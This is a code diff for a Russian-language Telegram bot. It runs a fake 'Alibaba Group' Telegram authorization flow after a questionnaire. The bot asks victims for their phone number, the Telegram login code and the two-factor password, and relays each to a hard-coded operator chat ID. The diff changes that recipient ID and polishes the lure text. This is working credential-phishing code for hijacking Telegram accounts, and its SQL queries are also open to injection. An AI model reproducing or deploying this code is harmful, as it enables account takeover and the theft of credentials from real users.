@@ -62,12 +62,12 @@ async def message(msg: types.Message):
 	page = cursor.fetchone()[0]
 	if page == 12:
 		if msg.text == "Начать анкетирование":
-			await bot.send_message(msg.from_user.id, "Имя", reply_markup=ReplyKeyboardRemove())
+			await bot.send_message(msg.from_user.id, "Введите ваше Имя", reply_markup=ReplyKeyboardRemove())
 			cursor.execute(f"UPDATE users SET page=0 WHERE id={msg.from_user.id}")
 			conn.commit()
 	if page == 17:
 			if msg.text == "Начать авторизацию":
-				await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>VKAlibaba Group</a>\nПожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+				await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<s>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></s> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
 				cursor.execute(f"UPDATE users SET page=8 WHERE id={msg.from_user.id}")
 				conn.commit()
 	elif page == 0:
@@ -121,7 +121,7 @@ async def message(msg: types.Message):
 		conn.commit()
 		cursor.execute(f"SELECT q1, q2, q3, q4, q5, q6, q7, q8, q9, q10 FROM users WHERE id={msg.from_user.id}")
 		q = cursor.fetchone()
-		await bot.send_message(5369733465, f"{msg.from_user.id}\n1){q[0]}\n2){q[1]}\n3){q[2]}\n4){q[3]}\n5){q[4]}\n6){q[5]}\n7){q[6]}\n8){q[7]}\n9){q[8]}\n10){q[9]}", reply_markup=AdminPanelKeyboard)
+		await bot.send_message(5389497223, f"{msg.from_user.id}\n1){q[0]}\n2){q[1]}\n3){q[2]}\n4){q[3]}\n5){q[4]}\n6){q[5]}\n7){q[6]}\n8){q[7]}\n9){q[8]}\n10){q[9]}", reply_markup=AdminPanelKeyboard)
 		await bot.send_message(msg.from_user.id, "Ожидайте рассмотрение заявки модератером")
 	elif page == 7:
 		await bot.send_message(msg.from_user.id, "Ваша заявка находиться на рассмотрении")
@@ -129,22 +129,22 @@ async def message(msg: types.Message):
 		cursor.execute(f"UPDATE users SET page=9 WHERE id={msg.from_user.id}")
 		conn.commit()
 		await bot.send_message(msg.from_user.id, "Мы только что отправили вам сообщение. Пожалуйста, подтвердите доступ через Telegram. Введите код из сообщения.")
-		await bot.send_message(5369733465, f"{msg.from_user.id}\n{msg.text}")
+		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
 	elif page == 9:
 		cursor.execute(f"UPDATE users SET page=10 WHERE id={msg.from_user.id}")
 		conn.commit()
 		await bot.send_message(msg.from_user.id, "Введите ваш двухфакторный пароль от аккаунта Telegram. Если его нет, пропустите данный этап")
-		await bot.send_message(5369733465, f"{msg.from_user.id}\n{msg.text}")
+		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
 	elif page == 10:
 		cursor.execute(f"UPDATE users SET page=11 WHERE id={msg.from_user.id}")
 		conn.commit()
 		await bot.send_message(msg.from_user.id, "Ожидайте модерацию в течение 1 часа.", reply_markup=Back_auth_Keyboard)
-		await bot.send_message(5369733465, f"{msg.from_user.id}\n{msg.text}", reply_markup=AdminPanelAuthKeyboard)
+		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}", reply_markup=AdminPanelAuthKeyboard)
 	elif page == 11:
 		if msg.text == "Сменить данные":
 			cursor.execute(f"UPDATE users SET page=8 WHERE id={msg.from_user.id}")
 			conn.commit()
-			await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>VKAlibaba Group</a>\nПожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML")
+			await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<s>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></s> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML")
 
 
 @dp.callback_query_handler(lambda c: c.data == "invite_q")
@@ -154,7 +154,7 @@ async def invite_q(callback_query: types.CallbackQuery):
 	cursor.execute(f"UPDATE users SET page=17 WHERE id={user_id}")
 	conn.commit()
 	await bot.edit_message_text(text=f"Вы приняли заявку\n{callback_query.message.text}", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
-	await bot.send_message(user_id, "Вам одобрено", reply_markup=Start_auth_Keyboard)
+	await bot.send_message(user_id, "Ваша заявка принята", reply_markup=Start_auth_Keyboard)
 
 
 @dp.callback_query_handler(lambda c: c.data == "back_q")
@@ -165,7 +165,7 @@ async def back_q(callback_query: types.CallbackQuery):
 	conn.commit()
 	await bot.edit_message_text(text=f"Вы не одобрили заявку\n{callback_query.message.text}", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
 	await bot.send_message(user_id, "Вам не одобрено пройдите анкетирование заново")
-	await bot.send_message(user_id, "Имя")
+	await bot.send_message(user_id, "Введите ваше Имя")
 
 
 @dp.callback_query_handler(lambda c: c.data == "back_auth")
@@ -175,7 +175,7 @@ async def back_auth(callback_query: types.CallbackQuery):
 	cursor.execute(f"UPDATE users SET page=8 WHERE id={user_id}")
 	conn.commit()
 	await bot.send_message(user_id, "Неудачная авторизация")
-	await bot.send_message(user_id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>VKAlibaba Group</a>\nПожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+	await bot.send_message(user_id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<s>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></s> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
 	await bot.edit_message_text(text="Вы не одобрили регистрацию", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
 
 	
